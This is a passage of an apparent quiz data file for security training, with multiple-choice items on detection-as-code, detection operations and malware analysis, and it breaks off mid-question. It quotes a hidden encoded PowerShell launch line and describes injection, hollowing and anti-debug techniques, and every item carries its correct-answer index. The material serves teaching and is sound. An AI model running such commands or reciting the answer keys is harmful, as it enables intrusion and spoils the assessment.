        id: "de-q5-1",
        difficulty: "easy",
        tags: ["Version Control"],
        scenario: "A rule breaks prod and no one can say who changed it, when, or why.",
        question: "What is the minimum Detection-as-Code baseline?",
        options: [
          "Wiki page of rules",
          "All rules in Git with PR review, signed commits, changelog, and one owner per rule — history + accountability + rollback in one system",
          "Shared drive of YAMLs",
          "Screenshots of the UI"
        ],
        correctAnswer: 1,
        explanation: "Git + PR review + owners gives you traceability, review, and rollback — the foundation of everything else."
      },
      {
        id: "de-q5-2",
        difficulty: "easy",
        tags: ["CI"],
        scenario: "A PR adds a new SIGMA rule with a syntax error. It merges anyway.",
        question: "What CI step was missing?",
        options: [
          "None",
          "Lint + schema validation + backend conversion (sigma → SPL/KQL) as required checks on every PR — nothing merges red",
          "Manual review only",
          "Post-merge tests"
        ],
        correctAnswer: 1,
        explanation: "Lint, schema, and conversion must be required PR checks; humans are unreliable for syntax."
      },
      {
        id: "de-q5-3",
        difficulty: "medium",
        tags: ["Unit Tests"],
        scenario: "You want to verify a new rule fires on a malicious sample event and does NOT fire on a benign lookalike.",
        question: "Which test pattern implements this?",
        options: [
          "Live prod testing",
          "Table-driven unit tests: fixtures of `should_match` and `should_not_match` events run through the rule engine in CI; a change that breaks a fixture fails the build",
          "Copy to a sandbox and eyeball",
          "Skip — analysts will notice"
        ],
        correctAnswer: 1,
        explanation: "Fixture-based positive/negative tests catch regressions before deploy and document expected behavior."
      },
      {
        id: "de-q5-4",
        difficulty: "medium",
        tags: ["Atomic Testing"],
        scenario: "You want to prove the rule alerts against a real technique execution on a real endpoint.",
        question: "What tool/pattern is standard?",
        options: [
          "Manual demo",
          "Atomic Red Team (or Caldera) executes the technique on a lab host; automation asserts the expected alert fired within an SLA — closing the 'writes fine, doesn't detect' gap",
          "Send an email to the SOC",
          "Run nmap"
        ],
        correctAnswer: 1,
        explanation: "Atomic Red Team gives repeatable technique execution; automated assertion turns it into a regression test."
      },
      {
        id: "de-q5-5",
        difficulty: "medium",
        tags: ["Environments"],
        scenario: "Every new rule immediately goes to prod. Bad rules take down analyst dashboards.",
        question: "What environment topology is correct?",
        options: [
          "Prod only",
          "Dev → Staging (shadow / audit-only against prod data) → Prod, with promotion gated by tests and a soak period; noisy rules never reach analyst queues",
          "Two prods",
          "Prod with feature flags only"
        ],
        correctAnswer: 1,
        explanation: "Shadow/audit staging against real prod data is the safe path from author to alerting."
      },
      {
        id: "de-q5-6",
        difficulty: "medium",
        tags: ["Metadata Contract"],
        scenario: "PRs land with rules that have no severity, no ATT&CK mapping, and no owner.",
        question: "How do you enforce a metadata contract?",
        options: [
          "Ask nicely",
          "Schema-validate `meta:` fields (id, author, owner, severity, ATT&CK ID, data source, tests) as a required CI check — merges blocked if missing",
          "Post-merge audits",
          "Ignore metadata"
        ],
        correctAnswer: 1,
        explanation: "Schema-enforced metadata is the only reliable way to keep rule quality high at scale."
      },
      {
        id: "de-q5-7",
        difficulty: "hard",
        tags: ["Change Control"],
        scenario: "A rule change is emergency-deployed in the SIEM UI to stop an active incident and never makes it back to Git.",
        question: "What is the disciplined recovery?",
        options: [
          "Leave it",
          "Post-incident, reconcile SIEM state with Git (drift diff), commit the change with the incident ticket link, and add a policy that UI-only edits expire (auto-revert) or auto-open a PR",
          "Delete the change",
          "Blame the responder"
        ],
        correctAnswer: 1,
        explanation: "Emergency changes are legitimate; silent drift is not. Reconciliation + auto-PR keeps Git the source of truth."
      },
      {
        id: "de-q5-8",
        difficulty: "hard",
        tags: ["Secrets & Data"],
        scenario: "A PR adds a rule with a real customer domain and an internal IP range hardcoded in the YAML.",
        question: "What controls prevent this?",
        options: [
          "Post-hoc scrubbing",
          "Pre-commit + CI secret/PII scanners plus a policy that environment-specific values live in per-env config, not rule bodies — rules stay portable and safe to share",
          "Manual review only",
          "Ignore"
        ],
        correctAnswer: 1,
        explanation: "Detections travel between orgs and repos; environment coupling and secrets must be externalized."
      },
      {
        id: "de-q5-9",
        difficulty: "hard",
        tags: ["Deployment"],
        scenario: "A CI pipeline deploys 300 rules per week across Splunk, Sentinel, and Elastic.",
        question: "What deployment pattern is safest?",
        options: [
          "Deploy all at once",
          "Progressive rollout: canary rule set to a subset of the fleet/index, monitor FP and volume dashboards for a soak window, then fan out; auto-rollback on FP-budget breach",
          "Nightly cron restart",
          "Manual per rule"
        ],
        correctAnswer: 1,
        explanation: "Canaries + auto-rollback keep detection pipelines safe at scale, mirroring SWE deployment discipline."
      },
      {
        id: "de-q5-10",
        difficulty: "hard",
        tags: ["Governance"],
        scenario: "Auditors ask: 'prove that every deployed detection has been reviewed and tested'.",
        question: "What evidence trail satisfies this?",
        options: [
          "Trust us",
          "Git PR history with required reviewers, CI logs of lint/convert/unit/atomic tests, deployment logs signed by the pipeline identity, and rule metadata carrying the commit hash — a full chain from author to fire",
          "Wiki minutes",
          "Sample screenshots"
        ],
        correctAnswer: 1,
        explanation: "Full author-to-deploy provenance is the defensible answer and is a natural output of Detection-as-Code."
      }
    ]
  },
  {
    quizId: "de-q6",
    courseId: "detection-engineering",
    title: "Detection Operations",
    description: "Scenario-based tuning, metrics, coverage mapping, and lifecycle management.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      {
        id: "de-q6-1",
        difficulty: "easy",
        tags: ["Tuning Cadence"],
        scenario: "Rules are 'done' when merged. No one revisits them.",
        question: "What operational rhythm keeps detections healthy?",
        options: [
          "Yearly audit",
          "Weekly triage of top-N noisy rules + monthly review of low/no-fire rules + quarterly coverage review — tuning is a continuous program, not a one-off",
          "Never — rules are static",
          "Only on incident"
        ],
        correctAnswer: 1,
        explanation: "Detection health decays constantly; regular tuning cadences prevent noise and blind spots."
      },
      {
        id: "de-q6-2",
        difficulty: "easy",
        tags: ["Alert Triage Metrics"],
        scenario: "Leadership asks 'how good are our detections?' You have no numbers.",
        question: "Which minimum metric set proves detection quality?",
        options: [
          "Only alert count",
          "Per-rule: true-positive rate, false-positive rate, MTTD, MTTR, dispositioned outcomes, and rules-per-incident contribution — quality, not just volume",
          "Only rule count",
          "SIEM license usage"
        ],
        correctAnswer: 1,
        explanation: "Detection quality is measured by outcomes (TP/FP, MTTD/MTTR, incident contribution), not authoring throughput."
      },
      {
        id: "de-q6-3",
        difficulty: "medium",
        tags: ["ATT&CK Coverage"],
        scenario: "Two orgs claim '90% ATT&CK coverage'. Yours is 55%.",
        question: "What is the skeptical, actionable frame?",
        options: [
          "Buy more tools",
          "Coverage numbers are meaningless without: which sub-techniques + platforms are counted, whether detections are validated (atomic / purple), FP-tuned, in prod, and matched to your threat model — compare methodology first",
          "Delete the layer",
          "Match by any means"
        ],
        correctAnswer: 1,
        explanation: "Validated, tuned, threat-relevant coverage is the honest metric; raw percentages are vanity."
      },
      {
        id: "de-q6-4",
        difficulty: "medium",
        tags: ["Threat-Model Prioritization"],
        scenario: "You have finite hours and 300 open detection ideas.",
        question: "How do you prioritize?",
        options: [
          "First come first served",
          "Score by threat-to-org relevance (CTI + industry) × likelihood × current detection gap × feasibility (data available, effort) — highest score first, groomed weekly",
          "Loudest voice wins",
          "Only build easy ones"
        ],
        correctAnswer: 1,
        explanation: "A scored, groomed backlog turns detection engineering into a threat-driven program rather than a queue."
      },
      {
        id: "de-q6-5",
        difficulty: "medium",
        tags: ["FP Tuning"],
        scenario: "A rule for 'PowerShell -EncodedCommand' fires constantly on legitimate MECM operations from three known hosts.",
        question: "What is the correct tuning path?",
        options: [
          "Disable the rule",
          "Add a narrow, documented exclusion (host + parent process + user + signing context) inside the rule; log the exclusion in the rule metadata with an expiry review date",
          "Widen the rule",
          "Raise severity"
        ],
        correctAnswer: 1,
        explanation: "Targeted, documented, expiring exclusions preserve detection value while cutting noise — blanket disable is a coverage loss."
      },
      {
        id: "de-q6-6",
        difficulty: "medium",
        tags: ["Feedback Loop"],
        scenario: "Analysts triage 5,000 alerts/week but their dispositions never reach detection engineering.",
        question: "What operational glue fixes this?",
        options: [
          "Email summaries",
          "Structured dispositions (TP/FP/benign-true) written back into the alert, aggregated per rule into a dashboard the detection team owns — closes the loop from triage to tuning",
          "SOC keeps notes in Slack",
          "Ignore triage data"
        ],
        correctAnswer: 1,
        explanation: "Structured feedback from triage is the fuel for tuning. Without it, detection engineering is blind."
      },
      {
        id: "de-q6-7",
        difficulty: "hard",
        tags: ["Retirement"],
        scenario: "A rule has not fired in 18 months; its underlying technique is now covered by two better rules and an EDR native detection.",
        question: "What is the mature move?",
        options: [
          "Keep it forever — 'just in case'",
          "Retire it: mark superseded, link to replacement, archive in Git with rationale — retirement is a first-class step in the detection lifecycle",
          "Duplicate it to another SIEM",
          "Raise its severity"
        ],
        correctAnswer: 1,
        explanation: "Rules that never fire cost review time and dilute metrics. Deliberate retirement keeps the ruleset lean and honest."
      },
      {
        id: "de-q6-8",
        difficulty: "hard",
        tags: ["Purple Teaming"],
        scenario: "You want continuous evidence that deployed detections actually catch real technique execution.",
        question: "Which program design delivers this?",
        options: [
          "Annual red team only",
          "Continuous, automated purple teaming: scheduled Atomic Red Team / Caldera scenarios per (sub-)technique, results compared to expected alerts, drift shown on the coverage dashboard",
          "Vendor demos",
          "Manual tabletop"
        ],
        correctAnswer: 1,
        explanation: "Continuous validation converts coverage from a claim to a measurement — and catches silent regressions from data or rule changes."
      },
      {
        id: "de-q6-9",
        difficulty: "hard",
        tags: ["Postmortems"],
        scenario: "A breach dwelt 45 days. Two detections were in place for the initial-access technique but neither fired.",
        question: "What does a rigorous detection postmortem produce?",
        options: [
          "Punish the author",
          "Blameless review: reconstruct the technique, replay events against the rule, identify why it missed (data gap, logic gap, tuning error), assign a specific fix (data, rule, test) with an owner and SLA, and add a regression fixture",
          "Delete both rules",
          "No action"
        ],
        correctAnswer: 1,
        explanation: "Every missed detection is a lesson. Structured postmortems turn incidents into permanent test cases and coverage gains."
      },
      {
        id: "de-q6-10",
        difficulty: "hard",
        tags: ["Program KPIs"],
        scenario: "Your detection program is scored only on 'rules shipped per quarter'.",
        question: "What KPI mix actually reflects program value?",
        options: [
          "Ship more rules",
          "Validated ATT&CK coverage delta, MTTD/MTTR improvement, FP rate of shipped detections, % rules with owners + tests, rules retired, and incident contribution rate — outcomes and quality, not activity",
          "Only rule count",
          "Only alert volume"
        ],
        correctAnswer: 1,
        explanation: "Activity metrics are gameable. Outcome + quality KPIs (coverage, MTTD, FP rate, contribution) resist gaming and drive real program maturity."
      }
    ]
  },
  // DETECTION ENGINEERING BASICS — FINAL CERTIFICATION EXAM
  // ===================== Malware Analysis Fundamentals =====================
  {
    quizId: "ma-q1",
    courseId: "malware-analysis",
    title: "Malware Landscape & Lab Setup",
    description: "Scenario-based mastery of malware categories, threat actor motivations, and safe analysis environments.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      {
        id: "ma-q1-1",
        difficulty: "easy",
        tags: ["Taxonomy", "Ransomware"],
        scenario: "Helpdesk reports 40 workstations across three departments now show a .locked extension on shared documents and a README_DECRYPT.txt on every desktop. No lateral tooling has been observed yet, but file shares are mass-renaming.",
        question: "Which malware category best describes this behavior?",
        options: [
          "Rootkit — kernel-mode hiding",
          "Ransomware — mass file encryption with an extortion note",
          "Adware — browser popups",
          "Keylogger — credential capture"
        ],
        correctAnswer: 1,
        explanation: "Mass renaming with a new extension plus a ransom/decrypt note on every host is the defining behavior of ransomware."
      },
      {
        id: "ma-q1-2",
        difficulty: "easy",
        tags: ["Threat Actors"],
        scenario: "A sample avoids execution on hosts whose locale is Russian, Ukrainian, or Belarusian, and its C2 traffic peaks during Moscow business hours.",
        question: "What motivation profile does this most likely fit?",
        options: [
          "State-sponsored APT focused on Western defense",
          "Eastern-European cybercrime crew geofencing CIS to reduce local law-enforcement attention",
          "Hacktivist collective",
          "Insider threat"
        ],
        correctAnswer: 1,
        explanation: "CIS-locale exits and Moscow business-hour C2 are classic tradecraft of Eastern-European eCrime groups avoiding local prosecution."
      },
      {
        id: "ma-q1-3",
        difficulty: "medium",
        tags: ["Lab Isolation"],
        scenario: "Your new analyst spins up FlareVM on their laptop, snapshots it, and detonates a sample — but leaves the VM NIC on 'Bridged' so 'Wireshark works'.",
        question: "What is the critical mistake?",
        options: [
          "FlareVM should be run bare-metal",
          "Bridged networking places the guest on the corporate LAN — the sample can beacon, scan, or spread; use host-only + INetSim/FakeNet",
          "Snapshots corrupt static analysis",
          "Wireshark cannot capture inside a VM"
        ],
        correctAnswer: 1,
        explanation: "Analysis lab networking must be isolated (host-only, internal, or air-gapped) with simulated services. Bridged mode is an incident waiting to happen."
      },
      {
        id: "ma-q1-4",
        difficulty: "medium",
        tags: ["Sample Handling", "Chain of Custody"],
        scenario: "A partner emails you a suspected loader as a plain .exe attachment. You need to store it in the team repo and share hashes with intel peers.",
        question: "Which handling procedure is correct?",
        options: [
          "Rename to .txt and store on the network share",
          "Zip with a password (typically 'infected'), record SHA256 + source + received date, store in the malware zoo with restricted ACL",
          "Detonate first, then decide whether to keep it",
          "Forward the original email to distribution lists"
        ],
        correctAnswer: 1,
        explanation: "Password-protected archives prevent accidental execution and AV quarantine. Hashes and provenance preserve chain of custody."
      },
      {
        id: "ma-q1-5",
        difficulty: "medium",
        tags: ["REMnux", "FlareVM"],
        scenario: "The team standardises on two VMs: one Windows with FlareVM, one Linux with REMnux, on an internal-only vSwitch.",
        question: "What is REMnux primarily used for in this pipeline?",
        options: [
          "Running Windows PE samples natively",
          "Providing Linux-based reversing, network emulation (INetSim), and document/script triage tools",
          "Hosting the ticketing system",
          "Signing YARA rules"
        ],
        correctAnswer: 1,
        explanation: "REMnux ships INetSim, oletools, pdf-parser, radare2 and dozens of triage utilities — it plays the 'internet' and script analysis role opposite FlareVM."
      },
      {
        id: "ma-q1-6",
        difficulty: "medium",
        tags: ["Wipers"],
        scenario: "A destructive payload overwrites the MBR with junk and writes random bytes across every logical volume with no ransom note or key exchange.",
        question: "Which category applies?",
        options: [
          "Ransomware with a broken payment flow",
          "Wiper — destruction is the objective; the ransom framing (if any) is a cover story",
          "Rootkit",
          "Banking trojan"
        ],
        correctAnswer: 1,
        explanation: "No recoverable key, MBR destruction, and random overwrites are hallmark wiper behavior (NotPetya, HermeticWiper, WhisperGate)."
      },
      {
        id: "ma-q1-7",
        difficulty: "hard",
        tags: ["VM Detection", "Anti-Analysis"],
        scenario: "A sample runs benignly on your analysis VM but detonates on physical hardware in a partner lab. Static review shows checks for VMware Tools services, specific MAC OUIs, and CPU vendor strings.",
        question: "What is the sample doing and what is the fix?",
        options: [
          "It is corrupt — try a new copy",
          "Anti-VM / sandbox evasion; harden the VM (patch tools artefacts, spoof MAC, use bare-metal or a hardened hypervisor profile)",
          "It requires a GPU",
          "The internet is required — enable bridged"
        ],
        correctAnswer: 1,
        explanation: "Sample checks common virtualization artefacts to avoid analysts. Hide them or use bare-metal detonation."
      },
      {
        id: "ma-q1-8",
        difficulty: "hard",
        tags: ["MalwareBazaar", "OPSEC"],
        scenario: "You pull a fresh loader from MalwareBazaar for research and plan to detonate against live C2 to map infrastructure.",
        question: "Which OPSEC concern is most important?",
        options: [
          "MalwareBazaar bans research use",
          "Beaconing from your corporate egress attributes you to the actor and may tip them off — use a dedicated, attributable-safe egress (VPN/VPS) or a fully offline sim",
          "The sample will refuse to run outside the origin country",
          "Hashes on MalwareBazaar are always wrong"
        ],
        correctAnswer: 1,
        explanation: "Live-fire malware research from corporate IP space burns attribution and may retaliate. Use disposable egress or emulate the C2 offline."
      },
      {
        id: "ma-q1-9",
        difficulty: "hard",
        tags: ["Rootkits", "Bootkits"],
        scenario: "IR finds a signed .sys driver loaded before Defender starts, and PatchGuard telemetry shows kernel callback tampering. Standard EDR queries return 'no such process'.",
        question: "What class of threat and what is the reliable response?",
        options: [
          "User-mode adware — remove via Add/Remove Programs",
          "Kernel rootkit/bootkit — trust host telemetry is compromised; boot from clean media, image offline, rebuild",
          "PUP — ignore",
          "Fileless script — kill PowerShell"
        ],
        correctAnswer: 1,
        explanation: "Kernel-level compromise invalidates on-host tooling. Offline forensics and full rebuild are the only trustworthy path."
      },
      {
        id: "ma-q1-10",
        difficulty: "hard",
        tags: ["Legal", "Sharing"],
        scenario: "An analyst wants to upload a customer-provided sample to VirusTotal to enrich. The sample was captured from a regulated client environment.",
        question: "What is the correct call?",
        options: [
          "Upload immediately — sharing is caring",
          "Check contract / data-handling agreement first; VT is public and the sample (and any embedded secrets, filenames, or config) becomes searchable — prefer private sandboxes or hash-only lookups when in doubt",
          "Rename the file then upload",
          "Encrypt with a password and upload"
        ],
        correctAnswer: 1,
        explanation: "Uploaded samples are shared with the VT community/enterprise partners and are effectively permanent. Regulated data requires explicit authorisation or hash-only queries."
      }
    ]
  },
  {
    quizId: "ma-q2",
    courseId: "malware-analysis",
    title: "Static Analysis Techniques",
    description: "Scenario-based mastery of file identification, strings, PE structure, and packing detection.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      {
        id: "ma-q2-1",
        difficulty: "easy",
        tags: ["File ID", "Hashing"],
        scenario: "An analyst has 400 suspicious files pulled from an email quarantine and needs to quickly cluster near-duplicates so that only unique families get deep analysis.",
        question: "Which hashing scheme fits best?",
        options: [
          "MD5 — exact match only",
          "ssdeep / TLSH fuzzy hashing — clusters files with similar content even after minor changes",
          "CRC32 — collision-prone",
          "Base64 — not a hash"
        ],
        correctAnswer: 1,
        explanation: "Fuzzy hashes (ssdeep, TLSH) tolerate small mutations and are ideal for triaging variants of the same family."
      },
      {
        id: "ma-q2-2",
        difficulty: "easy",
        tags: ["Strings"],
        scenario: "`strings` output on a suspected loader shows almost nothing readable — no URLs, no API names, just garbled bytes and high-entropy runs.",
        question: "Most likely explanation?",
        options: [
          "The binary is empty",
          "Strings are packed/encoded/encrypted — run FLOSS or unpack first",
          "Windows binaries have no strings",
          "The file is a text file"
        ],
        correctAnswer: 1,
        explanation: "Missing readable strings + high entropy strongly implies packing or string obfuscation. FLOSS can decode common stackstring/XOR patterns."
      },
      {
        id: "ma-q2-3",
        difficulty: "medium",
        tags: ["PE Imports"],
        scenario: "PE import table shows only `LoadLibraryA`, `GetProcAddress`, `VirtualAlloc`, and `VirtualProtect` — nothing else.",
        question: "What does this tell you?",
        options: [
          "The binary is a benign shell",
          "Classic dynamic API resolution — real capabilities are hidden until runtime; expect in-memory unpacking",
          "The file is corrupt",
          "It is a .NET assembly"
        ],
        correctAnswer: 1,
        explanation: "A minimal import table plus LoadLibrary/GetProcAddress is the signature of runtime API resolution used by packers and shellcode loaders."
      },
      {
        id: "ma-q2-4",
        difficulty: "medium",
        tags: ["Entropy", "Packing"],
        scenario: "PE-bear reports a `.text` section with entropy 7.9/8.0 and raw size ≈ virtual size, while `.rsrc` is normal at 4.1.",
        question: "What is the finding?",
        options: [
          "Normal compiled code",
          "The code section is packed/encrypted — plan for unpacking (dump on OEP or use x64dbg + Scylla)",
          "The file is signed",
          "Compiler optimisation"
        ],
        correctAnswer: 1,
        explanation: "Entropy near 8.0 in the executable section is the canonical packed-code indicator."
      },
      {
        id: "ma-q2-5",
        difficulty: "medium",
        tags: ["Imphash", "Clustering"],
        scenario: "Two samples with completely different SHA256 hashes share the same imphash and identical Rich header.",
        question: "What can you infer?",
        options: [
          "Nothing — imphash is meaningless",
          "Likely built from the same toolchain / project; strong pivot for family clustering and hunting",
          "They are definitely identical",
          "One is a decoy"
        ],
        correctAnswer: 1,
        explanation: "Imphash + Rich header collisions indicate shared build environment/import order — a durable pivot for family and campaign clustering."
      },
      {
        id: "ma-q2-6",
        difficulty: "medium",
        tags: ["Timestamps"],
        scenario: "A sample's PE compilation timestamp reads `1992-06-19 22:22:17` — before the tooling it uses existed.",
        question: "Best interpretation?",
        options: [
          "The file is 30 years old",
          "Timestamp forgery — common actor tradecraft; do not use as truth, but keep as an IOC pivot across the campaign",
          "The clock was wrong at build time",
          "PE files have no timestamp"
        ],
        correctAnswer: 1,
        explanation: "Timestomping is trivial and common. Impossible values still cluster campaigns because actors reuse them."
      },
      {
        id: "ma-q2-7",
        difficulty: "hard",
        tags: ["UPX", "Unpacking"],
        scenario: "Detect It Easy flags UPX; sections are `UPX0` (empty raw) and `UPX1` (packed). `upx -d` fails with 'not packed by UPX'.",
        question: "What is happening and how do you unpack?",
        options: [
          "The file is not packed",
          "UPX signature was modified (common trick); run in a debugger, break on tail-jump after unpack stub, dump memory, fix IAT with Scylla",
          "Delete the UPX sections",
          "Use `strings` to recover it"
        ],
        correctAnswer: 1,
        explanation: "Modified UPX headers defeat the built-in unpacker. Dynamic unpacking via OEP breakpoint + memory dump + IAT reconstruction is the reliable route."
      },
      {
        id: "ma-q2-8",
        difficulty: "hard",
        tags: ["Overlay"],
        scenario: "Raw file size on disk is 2.4 MB but the PE headers only describe the first 480 KB.",
        question: "What is the extra data and why does it matter?",
        options: [
          "Padding — ignore",
          "PE overlay — often the encrypted second-stage payload or configuration; carve and analyse separately",
          "Digital signature only",
          "Compiler debug info"
        ],
        correctAnswer: 1,
        explanation: "Data appended past the PE image is the overlay. Loaders routinely store encrypted payloads/configs there."
      },
      {
        id: "ma-q2-9",
        difficulty: "hard",
        tags: ["Code Signing"],
        scenario: "A dropper is Authenticode-signed by a small legitimate company you have never heard of. Signature validates.",
        question: "Best analytic stance?",
        options: [
          "Signed = safe — close the ticket",
          "Treat as compromised / abused code-signing cert; report to the CA, revocation may be needed, and hunt other samples signed by the same subject",
          "Signature has no meaning",
          "Rebuild the certificate"
        ],
        correctAnswer: 1,
        explanation: "Stolen or abused signing certs are a recurring supply-chain tradecraft. Signature validity is not a trust decision on its own."
      },
      {
        id: "ma-q2-10",
        difficulty: "hard",
        tags: ["Resources"],
        scenario: "PE `.rsrc` contains a 900 KB `RT_RCDATA` entry with entropy 7.95 that is not referenced by any visible resource-loading code.",
        question: "Most probable role?",
        options: [
          "Application icons",
          "Encrypted embedded payload/config decrypted at runtime — extract, guess the key from surrounding code, decrypt statically if possible",
          "Localization strings",
          "Version metadata"
        ],
        correctAnswer: 1,
        explanation: "High-entropy RCDATA blobs are a favourite hiding place for stage-2 payloads and encrypted C2 configuration."
      }
    ]
  },
  {
    quizId: "ma-q3",
    courseId: "malware-analysis",
    title: "Dynamic & Behavioral Analysis",
    description: "Scenario-based mastery of sandboxing, process/registry monitoring, network capture, and API tracing.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      {
        id: "ma-q3-1",
        difficulty: "easy",
        tags: ["Sandbox"],
        scenario: "A junior detonates the sample in the corporate sandbox and reports 'nothing happened'. Procmon shows only 12 seconds of execution before exit.",
        question: "Most likely reason?",
        options: [
          "Malware is broken",
          "Sandbox evasion — sleep/timing checks, missing user activity, or VM artefacts caused early exit; extend run time, simulate user, and mask artefacts",
          "Sandbox is offline",
          "AV cleaned it"
        ],
        correctAnswer: 1,
        explanation: "Short-duration 'benign' runs frequently indicate evasion; mitigate with time acceleration, user simulation, and hardened sandbox profiles."
      },
      {
        id: "ma-q3-2",
        difficulty: "easy",
        tags: ["Procmon"],
        scenario: "You need to see every file, registry, and process operation the sample performs, with filters for the parent PID.",
        question: "Which tool is the right fit?",
        options: [
          "Wireshark",
          "Sysinternals Process Monitor (Procmon) with a PID filter and a PML capture",
          "Ghidra",
          "PE-bear"
        ],
        correctAnswer: 1,
        explanation: "Procmon is the canonical live-events tool for filesystem, registry, and process activity — critical for behavioural triage."
      },
      {
        id: "ma-q3-3",
        difficulty: "medium",
        tags: ["Registry Persistence"],
        scenario: "Regshot diff after detonation shows a new value under `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` pointing to `%APPDATA%\\svchost.exe`.",
        question: "What technique and IOC?",
        options: [
          "Legitimate Windows Update",
          "Registry Run Key persistence (T1547.001); IOC = the fake svchost path and the Run value name",
          "Scheduled task",
          "DLL side-loading"
        ],
        correctAnswer: 1,
        explanation: "Run keys are the most common userland persistence; the value and path are high-quality IOCs and detection opportunities."
      },
      {
        id: "ma-q3-4",
        difficulty: "medium",
        tags: ["FakeNet", "INetSim"],
        scenario: "You want to see the sample's C2 URLs, HTTP verbs, User-Agent, and any downloaded stage without letting it actually reach the internet.",
        question: "Which tool combination is designed for this?",
        options: [
          "Wireshark alone on a real network",
          "FakeNet-NG or INetSim on the analysis VM — intercept DNS/HTTP/TLS, serve canned responses, and log everything",
          "Only host firewall rules",
          "Airplane mode"
        ],
        correctAnswer: 1,
        explanation: "FakeNet-NG/INetSim spoof the internet at the network layer so malware happily beacons and reveals its protocol without egress risk."
      },
      {
        id: "ma-q3-5",
        difficulty: "medium",
        tags: ["Process Tree"],
        scenario: "Process Hacker tree shows `winword.exe → cmd.exe → powershell.exe -enc <base64> → rundll32.exe`.",
        question: "How do you read this chain?",
        options: [
          "Normal Office update",
          "Macro-borne execution chain: Office spawning cmd/PowerShell with encoded command, then rundll32 for injection/second stage — high-confidence malicious",
          "User error",
          "Windows telemetry"
        ],
        correctAnswer: 1,
        explanation: "Office → cmd/PowerShell → rundll32 is one of the highest-signal malicious chains and a standard detection anchor."
      },
      {
        id: "ma-q3-6",
        difficulty: "medium",
        tags: ["API Monitor"],
        scenario: "You suspect process hollowing but need proof. Which API sequence would confirm it?",
        question: "Pick the tell-tale sequence:",
        options: [
          "OpenFile → ReadFile → CloseHandle",
          "CreateProcess(SUSPENDED) → NtUnmapViewOfSection → VirtualAllocEx → WriteProcessMemory → SetThreadContext → ResumeThread",
          "RegOpenKey → RegQueryValue → RegCloseKey",
          "socket → connect → send → recv"
        ],
        correctAnswer: 1,
        explanation: "That exact sequence is the process-hollowing recipe (T1055.012) and can be traced with API Monitor / ETW."
      },
      {
        id: "ma-q3-7",
        difficulty: "hard",
        tags: ["TLS", "MITM"],
        scenario: "Sample beacons over HTTPS to a hardcoded domain and pins its own certificate — mitmproxy handshakes fail.",
        question: "Best move to still read the traffic?",
        options: [
          "Give up",
          "Patch the pinning check in the binary (or hook the cert-validation API) so mitmproxy's CA is accepted, or extract keys via SSLKEYLOGFILE / API hooks",
          "Use plain HTTP",
          "Turn off Wireshark"
        ],
        correctAnswer: 1,
        explanation: "Certificate pinning must be defeated in the client — patch, hook, or extract session keys — to inspect TLS-protected C2."
      },
      {
        id: "ma-q3-8",
        difficulty: "hard",
        tags: ["Injection"],
        scenario: "The sample writes bytes into `explorer.exe` via `WriteProcessMemory` and executes them with `CreateRemoteThread`. Explorer then makes network calls the sample never made.",
        question: "What is this technique?",
        options: [
          "DLL side-loading",
          "Classic Remote Thread Injection (T1055) — malicious code runs under a trusted process to blend with normal user activity",
          "COM hijack",
          "Named-pipe IPC"
        ],
        correctAnswer: 1,
        explanation: "WriteProcessMemory + CreateRemoteThread into a legitimate process is textbook remote-thread injection; attribution of network activity to the host process is the goal."
      },
      {
        id: "ma-q3-9",
        difficulty: "hard",
        tags: ["Beacon"],
        scenario: "Wireshark shows the sample sending a 132-byte HTTPS POST to the same URL every 60±5 seconds with no user interaction.",
        question: "How do you characterise this?",
        options: [
          "User browsing",
          "C2 beaconing with jitter — perfect candidate for JA3/JA3S fingerprinting, interval hunting, and Suricata detection",
          "Software update",
          "NTP traffic"
        ],
        correctAnswer: 1,
        explanation: "Fixed-size periodic POSTs with jitter are the signature of C2 beacons; timing + TLS fingerprints are strong detection anchors."
      },
      {
        id: "ma-q3-10",
        difficulty: "hard",
        tags: ["Anti-Debug"],
        scenario: "Inside x64dbg the sample immediately exits, but detonated without the debugger it runs normally. Static review shows a call to `IsDebuggerPresent` and `NtQueryInformationProcess(ProcessDebugPort)`.",
        question: "Correct remediation?",
        options: [
          "Recompile the sample",
          "Anti-debug checks — patch/hook the return values, use ScyllaHide or similar plugins, then continue analysis",
          "Use only static analysis forever",
          "Reboot"
        ],
        correctAnswer: 1,
        explanation: "Anti-debug APIs are defeated by patching the checks or using plugins (ScyllaHide, TitanHide) that transparently spoof the results."
      }
    ]
  },
  {
    quizId: "ma-q4",
    courseId: "malware-analysis",
    title: "Document & Script Malware",
    description: "Scenario-based mastery of macro, PDF, PowerShell, and modern delivery vectors.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      {
        id: "ma-q4-1",
        difficulty: "easy",
        tags: ["Macros"],
        scenario: "A user forwards `Invoice_Feb.docm` that asks to 'Enable Content'. IR needs to know what the macro does without opening it in Word.",
        question: "Which tool is the right first step?",
        options: [
          "Word in Safe Mode",
          "olevba (oletools) — dump and triage the VBA project statically",
          "Notepad",
          "Any.Run only"
        ],
        correctAnswer: 1,
        explanation: "olevba parses the OLE container, prints VBA source, and flags AutoExec / Suspicious / IOC patterns — the standard first pass."
      },
      {
        id: "ma-q4-2",
        difficulty: "easy",
        tags: ["PDF"],
        scenario: "A PDF triggers alerts but Adobe Reader shows a blank page. You need to enumerate objects and any JavaScript.",
        question: "Best tool?",
        options: [
          "olevba",
          "pdf-parser / peepdf — enumerate objects, streams, /JS, /JavaScript, /OpenAction, /Launch",
          "Ghidra",
          "Regshot"
        ],
        correctAnswer: 1,
        explanation: "pdf-parser and peepdf inspect the PDF object graph and flag active-content keys used to auto-execute payloads."
      },
      {
        id: "ma-q4-3",
        difficulty: "medium",
        tags: ["PowerShell"],
        scenario: "The macro launches: `powershell -nop -w hidden -enc <long base64>`.",
        question: "Correct triage step?",
        options: [
          "Run it and see",
          "Base64-decode the payload (offline), then iteratively deobfuscate — expect further layers of compression/XOR/IEX",
          "Ignore — encoded means safe",
          "Report the base64 as the IOC and stop"
        ],
        correctAnswer: 1,
        explanation: "Encoded PowerShell almost always wraps additional obfuscation; decoding is a peeled onion, not a single step."
      },
      {
        id: "ma-q4-4",
        difficulty: "medium",
        tags: ["AutoExec"],
        scenario: "olevba flags `AutoOpen` and `Document_Open` subs, plus `Shell` and `URLDownloadToFile` calls.",
        question: "What is the delivery pattern?",
        options: [
          "Benign template",
